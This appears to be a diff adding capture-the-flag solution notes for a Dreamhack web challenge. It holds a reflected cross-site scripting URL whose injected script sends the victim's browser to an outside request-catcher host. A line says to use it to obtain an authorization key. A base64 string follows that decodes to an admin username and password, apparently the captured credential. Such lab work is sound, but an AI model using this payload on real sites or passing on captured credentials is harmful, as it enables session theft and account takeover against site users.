@@ -1,0 +1,6 @@
+http://127.0.0.1:8000/intro?name=<script>location.href="https://olymkmk.request.dreamhack.games"</script>&detail=what
+
+use that to get authorization key by sending http request with it
+
+YWRtaW46MWRlOThlMTM3MDhjMWYxZjYwMjNlMTMxYTdiZDg2NzY
+
